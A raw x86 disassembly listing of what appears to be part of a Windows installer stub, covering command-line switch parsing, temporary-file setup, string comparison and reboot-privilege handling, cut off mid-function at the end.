  4032b2:	8b f0                	mov    %eax,%esi
  4032b4:	a1 ec 05 47 00       	mov    0x4705ec,%eax
  4032b9:	83 c0 1c             	add    $0x1c,%eax
  4032bc:	50                   	push   %eax
  4032bd:	e8 0e fc ff ff       	call   0x402ed0
  4032c2:	ff 75 ec             	push   -0x14(%ebp)
  4032c5:	56                   	push   %esi
  4032c6:	53                   	push   %ebx
  4032c7:	6a ff                	push   $0xffffffff
  4032c9:	e8 19 fc ff ff       	call   0x402ee7
  4032ce:	3b 45 ec             	cmp    -0x14(%ebp),%eax
  4032d1:	75 5a                	jne    0x40332d
  4032d3:	f6 45 d8 01          	testb  $0x1,-0x28(%ebp)
  4032d7:	89 35 9c 05 47 00    	mov    %esi,0x47059c
  4032dd:	8b 06                	mov    (%esi),%eax
  4032df:	a3 e8 05 47 00       	mov    %eax,0x4705e8
  4032e4:	74 06                	je     0x4032ec
  4032e6:	ff 05 e4 05 47 00    	incl   0x4705e4
  4032ec:	6a 08                	push   $0x8
  4032ee:	59                   	pop    %ecx
  4032ef:	8d 46 44             	lea    0x44(%esi),%eax
  4032f2:	83 e8 08             	sub    $0x8,%eax
  4032f5:	01 30                	add    %esi,(%eax)
  4032f7:	49                   	dec    %ecx
  4032f8:	3b cb                	cmp    %ebx,%ecx
  4032fa:	75 f6                	jne    0x4032f2
  4032fc:	6a 01                	push   $0x1
  4032fe:	53                   	push   %ebx
  4032ff:	53                   	push   %ebx
  403300:	ff 75 f4             	push   -0xc(%ebp)
  403303:	ff 15 5c 81 40 00    	call   *0x40815c
  403309:	89 46 3c             	mov    %eax,0x3c(%esi)
  40330c:	6a 40                	push   $0x40
  40330e:	83 c6 04             	add    $0x4,%esi
  403311:	56                   	push   %esi
  403312:	68 a0 05 47 00       	push   $0x4705a0
  403317:	e8 72 25 00 00       	call   0x40588e
  40331c:	33 c0                	xor    %eax,%eax
  40331e:	5f                   	pop    %edi
  40331f:	5e                   	pop    %esi
  403320:	5b                   	pop    %ebx
  403321:	c9                   	leave
  403322:	c2 04 00             	ret    $0x4
  403325:	6a 01                	push   $0x1
  403327:	e8 0e fb ff ff       	call   0x402e3a
  40332c:	59                   	pop    %ecx
  40332d:	b8 18 83 40 00       	mov    $0x408318,%eax
  403332:	eb ea                	jmp    0x40331e
  403334:	56                   	push   %esi
  403335:	be c8 50 4d 00       	mov    $0x4d50c8,%esi
  40333a:	56                   	push   %esi
  40333b:	e8 7b 27 00 00       	call   0x405abb
  403340:	56                   	push   %esi
  403341:	e8 60 24 00 00       	call   0x4057a6
  403346:	85 c0                	test   %eax,%eax
  403348:	75 02                	jne    0x40334c
  40334a:	5e                   	pop    %esi
  40334b:	c3                   	ret
  40334c:	56                   	push   %esi
  40334d:	e8 68 2c 00 00       	call   0x405fba
  403352:	6a 00                	push   $0x0
  403354:	56                   	push   %esi
  403355:	ff 15 84 80 40 00    	call   *0x408084
  40335b:	56                   	push   %esi
  40335c:	68 c0 10 4d 00       	push   $0x4d10c0
  403361:	e8 9b 25 00 00       	call   0x405901
  403366:	5e                   	pop    %esi
  403367:	c3                   	ret
  403368:	55                   	push   %ebp
  403369:	8b ec                	mov    %esp,%ebp
  40336b:	56                   	push   %esi
  40336c:	8b 75 08             	mov    0x8(%ebp),%esi
  40336f:	57                   	push   %edi
  403370:	8b 7d 0c             	mov    0xc(%ebp),%edi
  403373:	33 c0                	xor    %eax,%eax
  403375:	0f b7 0e             	movzwl (%esi),%ecx
  403378:	0f b7 17             	movzwl (%edi),%edx
  40337b:	46                   	inc    %esi
  40337c:	46                   	inc    %esi
  40337d:	47                   	inc    %edi
  40337e:	47                   	inc    %edi
  40337f:	ff 4d 10             	decl   0x10(%ebp)
  403382:	66 3b ca             	cmp    %dx,%cx
  403385:	77 18                	ja     0x40339f
  403387:	72 11                	jb     0x40339a
  403389:	66 85 c9             	test   %cx,%cx
  40338c:	74 14                	je     0x4033a2
  40338e:	66 85 d2             	test   %dx,%dx
  403391:	74 0f                	je     0x4033a2
  403393:	39 45 10             	cmp    %eax,0x10(%ebp)
  403396:	75 dd                	jne    0x403375
  403398:	eb 08                	jmp    0x4033a2
  40339a:	83 c8 ff             	or     $0xffffffff,%eax
  40339d:	eb 03                	jmp    0x4033a2
  40339f:	33 c0                	xor    %eax,%eax
  4033a1:	40                   	inc    %eax
  4033a2:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  4033a6:	5f                   	pop    %edi
  4033a7:	5e                   	pop    %esi
  4033a8:	76 13                	jbe    0x4033bd
  4033aa:	85 c0                	test   %eax,%eax
  4033ac:	75 0f                	jne    0x4033bd
  4033ae:	66 3b ca             	cmp    %dx,%cx
  4033b1:	74 0a                	je     0x4033bd
  4033b3:	66 85 c9             	test   %cx,%cx
  4033b6:	0f 95 c0             	setne  %al
  4033b9:	8d 44 00 ff          	lea    -0x1(%eax,%eax,1),%eax
  4033bd:	5d                   	pop    %ebp
  4033be:	c3                   	ret
  4033bf:	a1 10 a0 40 00       	mov    0x40a010,%eax
  4033c4:	83 f8 ff             	cmp    $0xffffffff,%eax
  4033c7:	74 0e                	je     0x4033d7
  4033c9:	50                   	push   %eax
  4033ca:	ff 15 bc 80 40 00    	call   *0x4080bc
  4033d0:	83 0d 10 a0 40 00 ff 	orl    $0xffffffff,0x40a010
  4033d7:	e8 03 04 00 00       	call   0x4037df
  4033dc:	6a 07                	push   $0x7
  4033de:	68 d0 90 4d 00       	push   $0x4d90d0
  4033e3:	e8 45 31 00 00       	call   0x40652d
  4033e8:	c3                   	ret
  4033e9:	81 ec d4 02 00 00    	sub    $0x2d4,%esp
  4033ef:	53                   	push   %ebx
  4033f0:	55                   	push   %ebp
  4033f1:	56                   	push   %esi
  4033f2:	57                   	push   %edi
  4033f3:	6a 20                	push   $0x20
  4033f5:	33 ed                	xor    %ebp,%ebp
  4033f7:	5e                   	pop    %esi
  4033f8:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  4033fc:	c7 44 24 10 70 85 40 	movl   $0x408570,0x10(%esp)
  403403:	00 
  403404:	89 6c 24 14          	mov    %ebp,0x14(%esp)
  403408:	ff 15 30 80 40 00    	call   *0x408030
  40340e:	68 01 80 00 00       	push   $0x8001
  403413:	ff 15 b4 80 40 00    	call   *0x4080b4
  403419:	55                   	push   %ebp
  40341a:	ff 15 b0 82 40 00    	call   *0x4082b0
  403420:	6a 08                	push   $0x8
  403422:	a3 78 06 47 00       	mov    %eax,0x470678
  403427:	e8 67 27 00 00       	call   0x405b93
  40342c:	55                   	push   %ebp
  40342d:	68 b4 02 00 00       	push   $0x2b4
  403432:	a3 90 05 47 00       	mov    %eax,0x470590
  403437:	8d 44 24 38          	lea    0x38(%esp),%eax
  40343b:	50                   	push   %eax
  40343c:	55                   	push   %ebp
  40343d:	68 6c 85 40 00       	push   $0x40856c
  403442:	ff 15 80 81 40 00    	call   *0x408180
  403448:	68 54 85 40 00       	push   $0x408554
  40344d:	68 80 85 46 00       	push   $0x468580
  403452:	e8 35 26 00 00       	call   0x405a8c
  403457:	ff 15 b0 80 40 00    	call   *0x4080b0
  40345d:	50                   	push   %eax
  40345e:	bf a0 10 4c 00       	mov    $0x4c10a0,%edi
  403463:	57                   	push   %edi
  403464:	e8 23 26 00 00       	call   0x405a8c
  403469:	55                   	push   %ebp
  40346a:	ff 15 30 81 40 00    	call   *0x408130
  403470:	66 83 3d a0 10 4c 00 	cmpw   $0x22,0x4c10a0
  403477:	22 
  403478:	a3 98 05 47 00       	mov    %eax,0x470598
  40347d:	8b c7                	mov    %edi,%eax
  40347f:	75 08                	jne    0x403489
  403481:	6a 22                	push   $0x22
  403483:	5e                   	pop    %esi
  403484:	b8 a2 10 4c 00       	mov    $0x4c10a2,%eax
  403489:	56                   	push   %esi
  40348a:	50                   	push   %eax
  40348b:	e8 f7 22 00 00       	call   0x405787
  403490:	50                   	push   %eax
  403491:	ff 15 50 82 40 00    	call   *0x408250
  403497:	8b f0                	mov    %eax,%esi
  403499:	89 74 24 1c          	mov    %esi,0x1c(%esp)
  40349d:	e9 8c 00 00 00       	jmp    0x40352e
  4034a2:	6a 20                	push   $0x20
  4034a4:	5b                   	pop    %ebx
  4034a5:	66 3b c3             	cmp    %bx,%ax
  4034a8:	75 07                	jne    0x4034b1
  4034aa:	46                   	inc    %esi
  4034ab:	46                   	inc    %esi
  4034ac:	66 39 1e             	cmp    %bx,(%esi)
  4034af:	74 f9                	je     0x4034aa
  4034b1:	66 83 3e 22          	cmpw   $0x22,(%esi)
  4034b5:	75 05                	jne    0x4034bc
  4034b7:	46                   	inc    %esi
  4034b8:	6a 22                	push   $0x22
  4034ba:	46                   	inc    %esi
  4034bb:	5b                   	pop    %ebx
  4034bc:	66 83 3e 2f          	cmpw   $0x2f,(%esi)
  4034c0:	75 5b                	jne    0x40351d
  4034c2:	46                   	inc    %esi
  4034c3:	46                   	inc    %esi
  4034c4:	66 83 3e 53          	cmpw   $0x53,(%esi)
  4034c8:	75 14                	jne    0x4034de
  4034ca:	0f b7 46 02          	movzwl 0x2(%esi),%eax
  4034ce:	66 83 f8 20          	cmp    $0x20,%ax
  4034d2:	74 05                	je     0x4034d9
  4034d4:	66 3b c5             	cmp    %bp,%ax
  4034d7:	75 05                	jne    0x4034de
  4034d9:	83 4c 24 14 02       	orl    $0x2,0x14(%esp)
  4034de:	6a 04                	push   $0x4
  4034e0:	68 48 85 40 00       	push   $0x408548
  4034e5:	56                   	push   %esi
  4034e6:	e8 7d fe ff ff       	call   0x403368
  4034eb:	83 c4 0c             	add    $0xc,%esp
  4034ee:	85 c0                	test   %eax,%eax
  4034f0:	75 14                	jne    0x403506
  4034f2:	0f b7 46 08          	movzwl 0x8(%esi),%eax
  4034f6:	66 83 f8 20          	cmp    $0x20,%ax
  4034fa:	74 05                	je     0x403501
  4034fc:	66 3b c5             	cmp    %bp,%ax
  4034ff:	75 05                	jne    0x403506
  403501:	83 4c 24 14 04       	orl    $0x4,0x14(%esp)
  403506:	6a 04                	push   $0x4
  403508:	8d 46 fc             	lea    -0x4(%esi),%eax
  40350b:	68 3c 85 40 00       	push   $0x40853c
  403510:	50                   	push   %eax
  403511:	e8 52 fe ff ff       	call   0x403368
  403516:	83 c4 0c             	add    $0xc,%esp
  403519:	85 c0                	test   %eax,%eax
  40351b:	74 1f                	je     0x40353c
  40351d:	53                   	push   %ebx
  40351e:	56                   	push   %esi
  40351f:	e8 63 22 00 00       	call   0x405787
  403524:	8b f0                	mov    %eax,%esi
  403526:	66 83 3e 22          	cmpw   $0x22,(%esi)
  40352a:	75 02                	jne    0x40352e
  40352c:	46                   	inc    %esi
  40352d:	46                   	inc    %esi
  40352e:	0f b7 06             	movzwl (%esi),%eax
  403531:	66 3b c5             	cmp    %bp,%ax
  403534:	0f 85 68 ff ff ff    	jne    0x4034a2
  40353a:	eb 1d                	jmp    0x403559
  40353c:	6a 08                	push   $0x8
  40353e:	8d 46 fc             	lea    -0x4(%esi),%eax
  403541:	55                   	push   %ebp
  403542:	50                   	push   %eax
  403543:	e8 b6 3c 00 00       	call   0x4071fe
  403548:	83 c4 0c             	add    $0xc,%esp
  40354b:	83 c6 04             	add    $0x4,%esi
  40354e:	56                   	push   %esi
  40354f:	68 a8 50 4c 00       	push   $0x4c50a8
  403554:	e8 33 25 00 00       	call   0x405a8c
  403559:	bb c8 50 4d 00       	mov    $0x4d50c8,%ebx
  40355e:	53                   	push   %ebx
  40355f:	68 04 20 00 00       	push   $0x2004
  403564:	ff 15 ac 80 40 00    	call   *0x4080ac
  40356a:	e8 c5 fd ff ff       	call   0x403334
  40356f:	85 c0                	test   %eax,%eax
  403571:	75 24                	jne    0x403597
  403573:	68 ff 1f 00 00       	push   $0x1fff
  403578:	53                   	push   %ebx
  403579:	ff 15 a8 80 40 00    	call   *0x4080a8
  40357f:	68 30 85 40 00       	push   $0x408530
  403584:	53                   	push   %ebx
  403585:	e8 1e 25 00 00       	call   0x405aa8
  40358a:	e8 a5 fd ff ff       	call   0x403334
  40358f:	85 c0                	test   %eax,%eax
  403591:	0f 84 91 00 00 00    	je     0x403628
  403597:	68 c0 10 4d 00       	push   $0x4d10c0
  40359c:	ff 15 6c 81 40 00    	call   *0x40816c
  4035a2:	ff 74 24 14          	push   0x14(%esp)
  4035a6:	e8 44 fb ff ff       	call   0x4030ef
  4035ab:	89 44 24 10          	mov    %eax,0x10(%esp)
  4035af:	3b c5                	cmp    %ebp,%eax
  4035b1:	75 75                	jne    0x403628
  4035b3:	39 2d e4 05 47 00    	cmp    %ebp,0x4705e4
  4035b9:	74 5d                	je     0x403618
  4035bb:	55                   	push   %ebp
  4035bc:	57                   	push   %edi
  4035bd:	e8 c5 21 00 00       	call   0x405787
  4035c2:	8b f0                	mov    %eax,%esi
  4035c4:	eb 16                	jmp    0x4035dc
  4035c6:	6a 04                	push   $0x4
  4035c8:	68 24 85 40 00       	push   $0x408524
  4035cd:	56                   	push   %esi
  4035ce:	e8 95 fd ff ff       	call   0x403368
  4035d3:	83 c4 0c             	add    $0xc,%esp
  4035d6:	85 c0                	test   %eax,%eax
  4035d8:	74 06                	je     0x4035e0
  4035da:	4e                   	dec    %esi
  4035db:	4e                   	dec    %esi
  4035dc:	3b f7                	cmp    %edi,%esi
  4035de:	73 e6                	jae    0x4035c6
  4035e0:	c7 44 24 10 b0 84 40 	movl   $0x4084b0,0x10(%esp)
  4035e7:	00 
  4035e8:	3b f7                	cmp    %edi,%esi
  4035ea:	72 67                	jb     0x403653
  4035ec:	33 c0                	xor    %eax,%eax
  4035ee:	66 89 06             	mov    %ax,(%esi)
  4035f1:	83 c6 08             	add    $0x8,%esi
  4035f4:	56                   	push   %esi
  4035f5:	e8 1c 2a 00 00       	call   0x406016
  4035fa:	85 c0                	test   %eax,%eax
  4035fc:	74 2a                	je     0x403628
  4035fe:	56                   	push   %esi
  4035ff:	68 a8 50 4c 00       	push   $0x4c50a8
  403604:	e8 83 24 00 00       	call   0x405a8c
  403609:	56                   	push   %esi
  40360a:	68 b0 90 4c 00       	push   $0x4c90b0
  40360f:	e8 78 24 00 00       	call   0x405a8c
  403614:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  403618:	83 0d 6c 06 47 00 ff 	orl    $0xffffffff,0x47066c
  40361f:	e8 a8 1d 00 00       	call   0x4053cc
  403624:	89 44 24 18          	mov    %eax,0x18(%esp)
  403628:	e8 92 fd ff ff       	call   0x4033bf
  40362d:	ff 15 b4 82 40 00    	call   *0x4082b4
  403633:	39 6c 24 10          	cmp    %ebp,0x10(%esp)
  403637:	0f 84 ed 00 00 00    	je     0x40372a
  40363d:	68 10 00 20 00       	push   $0x200010
  403642:	ff 74 24 14          	push   0x14(%esp)
  403646:	e8 d6 20 00 00       	call   0x405721
  40364b:	6a 02                	push   $0x2
  40364d:	ff 15 a4 80 40 00    	call   *0x4080a4
  403653:	68 10 85 40 00       	push   $0x408510
  403658:	53                   	push   %ebx
  403659:	e8 4a 24 00 00       	call   0x405aa8
  40365e:	be b8 d0 4c 00       	mov    $0x4cd0b8,%esi
  403663:	56                   	push   %esi
  403664:	53                   	push   %ebx
  403665:	ff 15 14 81 40 00    	call   *0x408114
  40366b:	85 c0                	test   %eax,%eax
  40366d:	74 b9                	je     0x403628
  40366f:	55                   	push   %ebp
  403670:	53                   	push   %ebx
  403671:	ff 15 84 80 40 00    	call   *0x408084
  403677:	53                   	push   %ebx
  403678:	ff 15 78 80 40 00    	call   *0x408078
  40367e:	66 39 2d a8 50 4c 00 	cmp    %bp,0x4c50a8
  403685:	75 0b                	jne    0x403692
  403687:	56                   	push   %esi
  403688:	68 a8 50 4c 00       	push   $0x4c50a8
  40368d:	e8 fa 23 00 00       	call   0x405a8c
  403692:	ff 74 24 1c          	push   0x1c(%esp)
  403696:	68 00 10 47 00       	push   $0x471000
  40369b:	e8 ec 23 00 00       	call   0x405a8c
  4036a0:	68 0c 85 40 00       	push   $0x40850c
  4036a5:	68 08 50 47 00       	push   $0x475008
  4036aa:	e8 dd 23 00 00       	call   0x405a8c
  4036af:	6a 1a                	push   $0x1a
  4036b1:	5f                   	pop    %edi
  4036b2:	be c8 21 43 00       	mov    $0x4321c8,%esi
  4036b7:	a1 9c 05 47 00       	mov    0x47059c,%eax
  4036bc:	ff b0 20 01 00 00    	push   0x120(%eax)
  4036c2:	56                   	push   %esi
  4036c3:	e8 d6 29 00 00       	call   0x40609e
  4036c8:	56                   	push   %esi
  4036c9:	ff 15 6c 81 40 00    	call   *0x40816c
  4036cf:	39 6c 24 10          	cmp    %ebp,0x10(%esp)
  4036d3:	74 3f                	je     0x403714
  4036d5:	6a 01                	push   $0x1
  4036d7:	56                   	push   %esi
  4036d8:	68 d8 d0 4d 00       	push   $0x4dd0d8
  4036dd:	ff 15 a0 80 40 00    	call   *0x4080a0
  4036e3:	85 c0                	test   %eax,%eax
  4036e5:	74 2d                	je     0x403714
  4036e7:	55                   	push   %ebp
  4036e8:	56                   	push   %esi
  4036e9:	e8 0c 2e 00 00       	call   0x4064fa
  4036ee:	a1 9c 05 47 00       	mov    0x47059c,%eax
  4036f3:	ff b0 24 01 00 00    	push   0x124(%eax)
  4036f9:	56                   	push   %esi
  4036fa:	e8 9f 29 00 00       	call   0x40609e
  4036ff:	56                   	push   %esi
  403700:	e8 bb 1f 00 00       	call   0x4056c0
  403705:	3b c5                	cmp    %ebp,%eax
  403707:	74 0b                	je     0x403714
  403709:	50                   	push   %eax
  40370a:	ff 15 bc 80 40 00    	call   *0x4080bc
  403710:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  403714:	66 ff 05 08 50 47 00 	incw   0x475008
  40371b:	4f                   	dec    %edi
  40371c:	75 99                	jne    0x4036b7
  40371e:	55                   	push   %ebp
  40371f:	53                   	push   %ebx
  403720:	e8 d5 2d 00 00       	call   0x4064fa
  403725:	e9 fe fe ff ff       	jmp    0x403628
  40372a:	39 2d 54 06 47 00    	cmp    %ebp,0x470654
  403730:	74 7b                	je     0x4037ad
  403732:	6a 03                	push   $0x3
  403734:	e8 5a 24 00 00       	call   0x405b93
  403739:	6a 04                	push   $0x4
  40373b:	8b d8                	mov    %eax,%ebx
  40373d:	e8 51 24 00 00       	call   0x405b93
  403742:	6a 05                	push   $0x5
  403744:	8b f0                	mov    %eax,%esi
  403746:	e8 48 24 00 00       	call   0x405b93
  40374b:	8b f8                	mov    %eax,%edi
  40374d:	3b dd                	cmp    %ebp,%ebx
  40374f:	74 48                	je     0x403799
  403751:	3b f5                	cmp    %ebp,%esi
  403753:	74 44                	je     0x403799
  403755:	3b fd                	cmp    %ebp,%edi
  403757:	74 40                	je     0x403799
  403759:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  40375d:	50                   	push   %eax
  40375e:	6a 28                	push   $0x28
  403760:	ff 15 9c 80 40 00    	call   *0x40809c
  403766:	50                   	push   %eax
  403767:	ff d3                	call   *%ebx
  403769:	85 c0                	test   %eax,%eax
  40376b:	74 2c                	je     0x403799
  40376d:	8d 44 24 24          	lea    0x24(%esp),%eax
  403771:	50                   	push   %eax
  403772:	68 e4 84 40 00       	push   $0x4084e4
  403777:	55                   	push   %ebp
  403778:	ff d6                	call   *%esi
  40377a:	55                   	push   %ebp
  40377b:	55                   	push   %ebp
  40377c:	55                   	push   %ebp
  40377d:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  403781:	50                   	push   %eax
  403782:	55                   	push   %ebp
  403783:	ff 74 24 30          	push   0x30(%esp)
  403787:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%esp)
  40378e:	00 
  40378f:	c7 44 24 44 02 00 00 	movl   $0x2,0x44(%esp)
  403796:	00 
  403797:	ff d7                	call   *%edi
  403799:	55                   	push   %ebp
  40379a:	6a 02                	push   $0x2
  40379c:	ff 15 58 82 40 00    	call   *0x408258
  4037a2:	85 c0                	test   %eax,%eax
  4037a4:	75 07                	jne    0x4037ad
  4037a6:	6a 09                	push   $0x9
  4037a8:	e8 70 dc ff ff       	call   0x40141d
  4037ad:	a1 6c 06 47 00       	mov    0x47066c,%eax
  4037b2:	83 f8 ff             	cmp    $0xffffffff,%eax
  4037b5:	74 04                	je     0x4037bb
  4037b7:	89 44 24 18          	mov    %eax,0x18(%esp)
  4037bb:	ff 74 24 18          	push   0x18(%esp)
  4037bf:	e9 89 fe ff ff       	jmp    0x40364d
  4037c4:	56                   	push   %esi
  4037c5:	8b 35 d0 61 43 00    	mov    0x4361d0,%esi
  4037cb:	eb 0a                	jmp    0x4037d7
  4037cd:	ff 74 24 08          	push   0x8(%esp)
  4037d1:	ff 56 04             	call   *0x4(%esi)
  4037d4:	8b 36                	mov    (%esi),%esi
  4037d6:	59                   	pop    %ecx
  4037d7:	85 f6                	test   %esi,%esi
  4037d9:	75 f2                	jne    0x4037cd
  4037db:	5e                   	pop    %esi
  4037dc:	c2 04 00             	ret    $0x4
  4037df:	56                   	push   %esi
  4037e0:	8b 35 d0 61 43 00    	mov    0x4361d0,%esi
  4037e6:	6a 00                	push   $0x0
  4037e8:	e8 d7 ff ff ff       	call   0x4037c4
  4037ed:	85 f6                	test   %esi,%esi
  4037ef:	74 1a                	je     0x40380b
  4037f1:	57                   	push   %edi
  4037f2:	8b fe                	mov    %esi,%edi
  4037f4:	ff 77 08             	push   0x8(%edi)
  4037f7:	8b 36                	mov    (%esi),%esi
  4037f9:	ff 15 38 81 40 00    	call   *0x408138
  4037ff:	57                   	push   %edi
  403800:	ff 15 2c 81 40 00    	call   *0x40812c
  403806:	85 f6                	test   %esi,%esi
  403808:	75 e8                	jne    0x4037f2
  40380a:	5f                   	pop    %edi
  40380b:	83 25 d0 61 43 00 00 	andl   $0x0,0x4361d0
  403812:	5e                   	pop    %esi
  403813:	c3                   	ret
  403814:	a1 d0 61 43 00       	mov    0x4361d0,%eax
  403819:	eb 0b                	jmp    0x403826
  40381b:	8b 48 08             	mov    0x8(%eax),%ecx
  40381e:	3b 4c 24 04          	cmp    0x4(%esp),%ecx
  403822:	74 0a                	je     0x40382e
  403824:	8b 00                	mov    (%eax),%eax
  403826:	85 c0                	test   %eax,%eax
  403828:	75 f1                	jne    0x40381b
  40382a:	40                   	inc    %eax
  40382b:	c2 04 00             	ret    $0x4
  40382e:	33 c0                	xor    %eax,%eax
  403830:	eb f9                	jmp    0x40382b
  403832:	56                   	push   %esi
  403833:	8b 74 24 08          	mov    0x8(%esp),%esi
  403837:	56                   	push   %esi
  403838:	e8 d7 ff ff ff       	call   0x403814
  40383d:	85 c0                	test   %eax,%eax
  40383f:	75 03                	jne    0x403844
  403841:	40                   	inc    %eax
  403842:	eb 2c                	jmp    0x403870
  403844:	6a 0c                	push   $0xc
  403846:	6a 40                	push   $0x40
  403848:	ff 15 20 81 40 00    	call   *0x408120
  40384e:	85 c0                	test   %eax,%eax
  403850:	74 1b                	je     0x40386d
  403852:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403856:	89 48 04             	mov    %ecx,0x4(%eax)
  403859:	8b 0d d0 61 43 00    	mov    0x4361d0,%ecx
  40385f:	89 70 08             	mov    %esi,0x8(%eax)
  403862:	89 08                	mov    %ecx,(%eax)
  403864:	a3 d0 61 43 00       	mov    %eax,0x4361d0
  403869:	33 c0                	xor    %eax,%eax
  40386b:	eb 03                	jmp    0x403870
  40386d:	83 c8 ff             	or     $0xffffffff,%eax
  403870:	5e                   	pop    %esi
  403871:	c2 08 00             	ret    $0x8
  403874:	83 7c 24 04 78       	cmpl   $0x78,0x4(%esp)
  403879:	75 06                	jne    0x403881
  40387b:	ff 05 54 85 46 00    	incl   0x468554
  403881:	6a 00                	push   $0x0
  403883:	ff 74 24 08          	push   0x8(%esp)
  403887:	68 08 04 00 00       	push   $0x408
  40388c:	ff 35 94 05 47 00    	push   0x470594
  403892:	ff 15 78 82 40 00    	call   *0x408278
  403898:	c2 04 00             	ret    $0x4
  40389b:	ff 74 24 0c          	push   0xc(%esp)
  40389f:	6a 00                	push   $0x0
  4038a1:	e8 f8 27 00 00       	call   0x40609e
  4038a6:	50                   	push   %eax
  4038a7:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4038ab:	05 e8 03 00 00       	add    $0x3e8,%eax
  4038b0:	50                   	push   %eax
  4038b1:	ff 74 24 0c          	push   0xc(%esp)
  4038b5:	e8 45 1e 00 00       	call   0x4056ff
  4038ba:	c2 0c 00             	ret    $0xc
  4038bd:	83 3d 4c 06 47 00 00 	cmpl   $0x0,0x47064c
  4038c4:	a1 f4 a1 43 00       	mov    0x43a1f4,%eax
  4038c9:	75 05                	jne    0x4038d0
  4038cb:	a1 04 a2 43 00       	mov    0x43a204,%eax
  4038d0:	6a 01                	push   $0x1
  4038d2:	6a 01                	push   $0x1
  4038d4:	68 f4 00 00 00       	push   $0xf4
  4038d9:	50                   	push   %eax
  4038da:	ff 15 78 82 40 00    	call   *0x408278
  4038e0:	c3                   	ret
  4038e1:	ff 74 24 04          	push   0x4(%esp)
  4038e5:	ff 35 04 a2 43 00    	push   0x43a204
  4038eb:	ff 15 70 82 40 00    	call   *0x408270
  4038f1:	c2 04 00             	ret    $0x4
  4038f4:	6a 01                	push   $0x1
  4038f6:	ff 74 24 08          	push   0x8(%esp)
  4038fa:	6a 28                	push   $0x28
  4038fc:	ff 35 94 05 47 00    	push   0x470594
  403902:	ff 15 78 82 40 00    	call   *0x408278
  403908:	c2 04 00             	ret    $0x4
  40390b:	a1 48 85 46 00       	mov    0x468548,%eax
  403910:	85 c0                	test   %eax,%eax
  403912:	74 0f                	je     0x403923
  403914:	6a 00                	push   $0x0
  403916:	6a 00                	push   $0x0
  403918:	ff 74 24 0c          	push   0xc(%esp)
  40391c:	50                   	push   %eax
  40391d:	ff 15 78 82 40 00    	call   *0x408278
  403923:	c2 04 00             	ret    $0x4
  403926:	55                   	push   %ebp
  403927:	8b ec                	mov    %esp,%ebp
  403929:	83 ec 0c             	sub    $0xc,%esp
  40392c:	05 cd fe ff ff       	add    $0xfffffecd,%eax
  403931:	56                   	push   %esi
  403932:	83 f8 05             	cmp    $0x5,%eax
  403935:	0f 87 8e 00 00 00    	ja     0x4039c9
  40393b:	6a eb                	push   $0xffffffeb
  40393d:	ff 75 0c             	push   0xc(%ebp)
  403940:	ff 15 48 82 40 00    	call   *0x408248
  403946:	8b f0                	mov    %eax,%esi
  403948:	85 f6                	test   %esi,%esi
  40394a:	74 7d                	je     0x4039c9
  40394c:	f6 46 14 02          	testb  $0x2,0x14(%esi)
  403950:	8b 06                	mov    (%esi),%eax
  403952:	57                   	push   %edi
  403953:	8b 3d 4c 82 40 00    	mov    0x40824c,%edi
  403959:	74 03                	je     0x40395e
  40395b:	50                   	push   %eax
  40395c:	ff d7                	call   *%edi
  40395e:	f6 46 14 01          	testb  $0x1,0x14(%esi)
  403962:	74 0a                	je     0x40396e
  403964:	50                   	push   %eax
  403965:	ff 75 08             	push   0x8(%ebp)
  403968:	ff 15 54 80 40 00    	call   *0x408054
  40396e:	ff 76 10             	push   0x10(%esi)
  403971:	ff 75 08             	push   0x8(%ebp)
  403974:	ff 15 50 80 40 00    	call   *0x408050
  40397a:	f6 46 14 08          	testb  $0x8,0x14(%esi)
  40397e:	8b 46 04             	mov    0x4(%esi),%eax
  403981:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403984:	74 06                	je     0x40398c
  403986:	50                   	push   %eax
  403987:	ff d7                	call   *%edi
  403989:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40398c:	f6 46 14 04          	testb  $0x4,0x14(%esi)
  403990:	5f                   	pop    %edi
  403991:	74 0a                	je     0x40399d
  403993:	50                   	push   %eax
  403994:	ff 75 08             	push   0x8(%ebp)
  403997:	ff 15 3c 80 40 00    	call   *0x40803c
  40399d:	f6 46 14 10          	testb  $0x10,0x14(%esi)
  4039a1:	74 21                	je     0x4039c4
  4039a3:	8b 46 08             	mov    0x8(%esi),%eax
  4039a6:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4039a9:	8b 46 0c             	mov    0xc(%esi),%eax
  4039ac:	85 c0                	test   %eax,%eax
  4039ae:	74 07                	je     0x4039b7
  4039b0:	50                   	push   %eax
  4039b1:	ff 15 44 80 40 00    	call   *0x408044
  4039b7:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4039ba:	50                   	push   %eax
  4039bb:	ff 15 48 80 40 00    	call   *0x408048
  4039c1:	89 46 0c             	mov    %eax,0xc(%esi)
  4039c4:	8b 46 0c             	mov    0xc(%esi),%eax
  4039c7:	eb 02                	jmp    0x4039cb
  4039c9:	33 c0                	xor    %eax,%eax
  4039cb:	5e                   	pop    %esi
  4039cc:	c9                   	leave
  4039cd:	c2 08 00             	ret    $0x8
  4039d0:	53                   	push   %ebx
  4039d1:	55                   	push   %ebp
  4039d2:	56                   	push   %esi
  4039d3:	57                   	push   %edi
  4039d4:	bf c0 10 4d 00       	mov    $0x4d10c0,%edi
  4039d9:	57                   	push   %edi
  4039da:	be ff ff 00 00       	mov    $0xffff,%esi
  4039df:	e8 08 20 00 00       	call   0x4059ec
  4039e4:	0f b7 d8             	movzwl %ax,%ebx
  4039e7:	8b 0d c4 05 47 00    	mov    0x4705c4,%ecx
  4039ed:	85 c9                	test   %ecx,%ecx
  4039ef:	74 42                	je     0x403a33
  4039f1:	a1 9c 05 47 00       	mov    0x47059c,%eax
  4039f6:	8b 40 64             	mov    0x64(%eax),%eax
  4039f9:	8b d0                	mov    %eax,%edx
  4039fb:	0f af c1             	imul   %ecx,%eax
  4039fe:	f7 da                	neg    %edx
  403a00:	03 05 c0 05 47 00    	add    0x4705c0,%eax
  403a06:	03 c2                	add    %edx,%eax
  403a08:	66 8b 28             	mov    (%eax),%bp
  403a0b:	66 33 eb             	xor    %bx,%bp
